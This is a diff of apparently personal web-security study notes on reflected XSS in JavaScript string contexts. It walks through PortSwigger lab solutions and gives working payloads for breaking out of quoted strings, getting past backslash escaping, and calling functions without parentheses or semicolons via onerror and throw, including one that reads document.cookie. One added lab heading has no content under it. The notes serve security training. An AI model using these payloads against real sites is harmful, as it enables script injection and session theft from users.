@@ -448,27 +448,211 @@ It's work
 
 > [**Python Script for this lab**](https://github.com/MohammedHawary/Solve-Portswigger-Labs-With_py/blob/main/XSS/Reflected_XSS_into_a_JavaScript_string_with_single_quote_and_backslash_escaped.py)
 
+### Breaking out of a JavaScript string
+
+When XSS occurs within a quoted string literal, it can allow direct JavaScript execution. To prevent issues, fix the script following the XSS context, as syntax errors can halt the entire script.
+
+Ways to break out of a string literal include:
+
+```js
+'-alert(document.domain)-'
+';alert(document.domain)//
+```
+
+Some websites hinder XSS by limiting character usage. This occurs at the website or through a **WAF** that blocks your requests. In such cases, explore alternative methods to execute functions and bypass security. Using the `throw` statement with an exception handler is one approach. It allows passing arguments to functions without parentheses. For instance, assigning the `alert()` function to the global exception handler and using the throw statement can trigger the `alert()` function with 1 as an argument.
+
+```js
+onerror=alert;throw 1
+```
+
+Some apps try to prevent input from breaking out of JavaScript strings by escaping **single quote** characters with a **backslash**. However, they often** forget to escape the backslash** itself, allowing attackers to use their own backslash to nullify the application's escape character.
+
+ For example, suppose that the input: 
+
+```js
+';alert(document.domain)//
+```
+
+ gets converted to:
+
+```js
+\';alert(document.domain)//
+```
+
+You can now use the alternative payload:
+
+    \';alert(document.domain)//
+
+which gets converted to:
+
+```js
+\\';alert(document.domain)//
+```
+
+In this case, the first backslash makes the second one a literal character, not a special one. As a result, the quote is treated as a string terminator, allowing the attack to succeed.
+
+#### EX1: Reflected XSS into a JavaScript string with angle brackets HTML encoded
+
+First, test with this `<asdfghjk123>` to know where the payload reflected or if there are any changes on it
+
+![Screenshot from 2023-09-08 22-18-35](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/cd54b191-922c-4485-87f1-cc1ed50e6381)
+In the page source There are two places reflected in page source the second place in JS code in var `searchTerms` and replace this signs `< >` with `&lt &gt`
+
+![Screenshot from 2023-09-08 22-18-57](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/11428011-cfe9-4a25-8cc1-054eac910a55)
+
+![Screenshot from 2023-09-08 22-19-25](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/826ef069-d71b-4c43-94ba-8160468ad154)
+Let's create payload with this info
+
+```js
+';javascript:alert("XSS")//
+            // or 
+';alert("XSS");'
+            // or 
+'-alert("XSS")-'
+```
+
+![Screenshot from 2023-09-08 22-21-48](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/4dc96561-ff9d-45c2-8f1a-0c87a6dcbd56)
+The script reflected correctly this let's show it in browser
+
+![Screenshot from 2023-09-08 22-22-31](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/43727950-b8bc-4903-95c2-89fc1315d31b)
+It's work
+
+![Screenshot from 2023-09-08 22-22-40](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/0dd1efd4-50ff-48a7-88d1-cd10c8ee6f76)
+![Screenshot from 2023-09-08 22-22-48](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/bf045492-de11-4d4e-9dae-1f26c35b7bc9)
+
+> [**Python Script for this lab**](https://github.com/MohammedHawary/Solve-Portswigger-Labs-With_py/blob/main/XSS/Reflected_XSS_into_a_JavaScript_string_with_angle_brackets_HTML_encoded.py)
+
+#### EX2: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+
+First, test with this `<img src="1" onerror="alert('asdfghjk123')">` to know where the payload reflected or if there are any changes on it![Screenshot from 2023-09-08 23-53-33](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/520e9361-2b3d-4690-be90-420b4daef041)
+
+In the page source There are two places reflected in page source the second place in JS code in var `searchTerms` and replace this signs `< >` with `&lt &gt` and `"` with `&quot` but adding `\` after `'`
+
+![Screenshot from 2023-09-08 23-45-40](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/3cb424bd-9623-484b-aa1e-2bb834410512)
+![Screenshot from 2023-09-08 23-53-02](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/bd4b9936-eafd-411e-b600-1fa962e731e9)
+
+Let's create our payload with this info
+
+```js
+\';alert(document.cookie)//
+```
+
+![Screenshot from 2023-09-08 23-54-23](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/4710c4d3-41bf-40c4-bdb5-3ae786835001)
+
+The script reflected correctly this let's show it in browser
+
+![Screenshot from 2023-09-08 23-37-44](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/a9a38d13-7b52-4c3d-a69c-204ce8af1351)
+It's work
+
+![Screenshot from 2023-09-08 23-37-51](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/a9e9932d-88ee-4763-8590-b6cc63003e09)
+![Screenshot from 2023-09-08 23-37-57](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/da597c50-aad1-4244-b345-a28cd84ed779)
+
+> [**Python Script for this lab**](https://github.com/MohammedHawary/Solve-Portswigger-Labs-With_py/blob/main/XSS/Reflected_XSS_into_a_JavaScript_string_with_angle_brackets_and_double_quotes_HTML_encoded_and_single_quotes_escaped.py)
+
+
+
+### XSS without parentheses and semi-colons
+
+![b1def7274037articlexsswithoutparenthesesarticle](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/31bd6c17-8a37-42cb-b546-3dc048129106)
+
+There are a way to invoke JavaScript functions without parentheses using `onerror` and the `throw` statement. It involves setting the `onerror` handler to the target function and using `throw` to pass the argument.
+
+```html
+<script>onerror=alert;throw 1337</script>
+```
+
+The `onerror` handler triggers whenever a JavaScript exception occurs, and the `throw` statement enables you to generate a custom exception with an expression passed to the `onerror` handler. Since `throw` is a statement, it's typically necessary to add a semicolon after the `onerror` assignment to start a new statement and prevent forming an expression.
+
+There is a website that filters out parentheses and semicolons. The first method is simple: use curly braces to create a block statement with your `onerror` assignment. After the blocking statement, use `throw` without a semicolon (or a newline):
+
+```html
+<script>{onerror=alert}throw 1337</script>
+```
+
+The block statement was effective, but there are a more intriguing option. Surprisingly, since the `throw` statement accepts an expression, you can place the `onerror` assignment within the `throw` statement. As the final part of the expression goes to the `onerror` handler, it triggers the function with the desired arguments. Here's how it operates:
+
+![03b498b7f41barticleonerror](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/7cfe5cf8-9a35-496e-9184-c3ad706fc724)
+
+```js
+<script>throw onerror=alert,'some string',123,'haha'</script>
+```
+
+If you've tried running the code you'll notice that **Chrome** prefixes the string sent to the exception handler with `Uncaught`.
+
+![2e3196af1042articleuncaughtalert](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/f6d48f0a-5d68-4972-83a2-5ff4ab036209)
+
+Using `eval` as an exception handler to evaluate strings. To recap, by prefixing your string with `=`, you make the `Uncaught` string a variable, allowing for the execution of arbitrary JavaScript. For instance:
+
+```html
+<script>{onerror=eval}throw'=alert\x281337\x29'</script>
+```
+
+The string passed to `eval` is `Uncaught=alert(1337)`. It functions correctly in **Chrome**. However, in **Firefox**, the exception is prefixed with the **two-word string** `uncaught exception` leading to a syntax error when evaluated.
+
+The `onerror/throw` technique doesn't function when executing a throw from the console. **This is because the throw statement executed in the console sends its result to the console itself, not the exception handler**.
+
+> **NOTE**
+> 
+> **Uncaught**: is a term commonly used in JavaScript error messages to indicate that an error occurred, but there was no corresponding error handler to catch and handle it. It essentially means that an exception was not caught by any try...catch block or handled in any other way.
+
+#### EX: Reflected XSS in a JavaScript URL with some characters blocked
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 ### Common questions about reflected cross-site scripting
 
 **Difference between reflected XSS and stored XSS**: Reflected XSS injects input into the immediate response, while stored XSS stores input and embeds it into a later response.
 
 **Difference between reflected XSS and self-XSS**: Self-XSS resembles reflected XSS in application behavior but requires the victim to submit the XSS payload, often through social engineering. Self-XSS is typically considered low-impact.
-
-### Exploiting cross-site scripting vulnerabilities
-
-To demonstrate XSS vulnerability, a common method is to create a popup using the `alert()` function. This isn't because XSS is related to popups; it's a way to show that you can run arbitrary JavaScript on a specific domain. Some may use `alert(document.domain)` to clarify the executing domain.
-
-Sometimes, it's necessary to go beyond proof and provide a complete exploit to illustrate the severity of an XSS vulnerability. In this section, we'll delve into three widely used and potent methods to exploit an XSS vulnerability.
-
-### Exploiting cross-site scripting to steal cookies
-
-Exploiting XSS to steal cookies is a traditional method. Since many web apps use cookies for session management, an attacker can use XSS to send the victim's cookies to their domain and impersonate the victim by injecting these cookies into the browser.
-
-However, this approach has limitations:
-
-- The victim may not be logged in.
-- Some apps protect cookies using the `HttpOnly` flag, making them inaccessible to JavaScript.
-- Additional security measures, like locking sessions to the user's IP address, can thwart attacks.
-- The session may expire before the attacker can hijack it.
-
-#### EX: Exploiting cross-site scripting to steal cookies
